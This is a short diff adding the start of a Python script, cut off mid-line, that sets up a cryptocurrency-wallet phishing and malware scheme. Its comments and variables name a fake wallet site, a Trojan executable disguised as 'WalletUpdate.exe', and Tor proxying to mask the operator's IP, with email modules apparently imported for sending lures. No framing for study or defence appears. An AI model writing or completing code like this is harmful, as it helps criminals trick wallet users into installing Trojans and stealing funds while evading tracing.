@@ -1,0 +1,15 @@
+import requests
+import os
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import socks
+import socket
+
+# Set up the fake website and Trojan file (hosted on a free service like GitHub Pages)
+fake_site ="http://evilwallet.github.io"
+trojan_file ="WalletUpdate.exe"
+
+# Set up Tor for anonymous browsing and IP masking
+socks.set_default_proxy(socks.SOCKS5,"127.0.0.1", 9050)
+socket.socket = socks.
